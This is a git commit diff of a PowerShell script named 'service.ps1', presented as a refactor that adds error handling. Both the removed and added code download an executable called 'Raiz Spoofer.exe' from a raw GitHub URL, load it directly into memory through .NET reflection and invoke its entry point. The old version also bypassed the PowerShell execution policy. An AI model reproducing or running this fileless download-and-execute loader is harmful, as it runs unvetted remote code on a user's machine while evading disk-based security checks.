932d653bb856c62afa6fa9f86afdf40b9098a335
tyu0720gyi <tr5457075@gmail.com>
2026-03-25 14:49:03 +0900

    Enhance service.ps1 with error handling and structure
    Refactored code to include error handling and improved readability.

--- service.ps1
+++ service.ps1
@@ -1,9 +1,23 @@
-$code = {
-    $u = "https://raw.githubusercontent.com/tyu0720gyi/service/main/Raiz%20Spoofer.exe"
-    $d = (New-Object System.Net.WebClient).DownloadData($u)
-    $a = [System.Reflection.Assembly]::Load($d)
-    $a.EntryPoint.Invoke($null, $null)
-    Write-Host "LOADED!" -ForegroundColor Cyan
-}.ToString()
 
-powershell -ExecutionPolicy Bypass -NoProfile -Command $code
+$url = "https://raw.githubusercontent.com/tyu0720gyi/service/main/Raiz%20Spoofer.exe"
+
+try {
+    Write-Host "[*] READ FILE FOR RAIZ SERVER..." -ForegroundColor Cyan
+    $webClient = New-Object System.Net.WebClient
+    
+
+    $data = $webClient.DownloadData($url)
+
+    Write-Host "[*] LOADING MEMORY..." -ForegroundColor Cyan
+    # 3. .NET 어셈블리로 로드
+    $assembly = [System.Reflection.Assembly]::Load($data)
+    
+    Write-Host "[+] STARTING..." -ForegroundColor Green
+
+    $assembly.EntryPoint.Invoke($null, @($null))
+    
+    Write-Host "LOADED!" -ForegroundColor Cyan
+}
+catch {
+    Write-Host "[-] 에러 발생: $($_.Exception.Message)" -ForegroundColor Red
+}
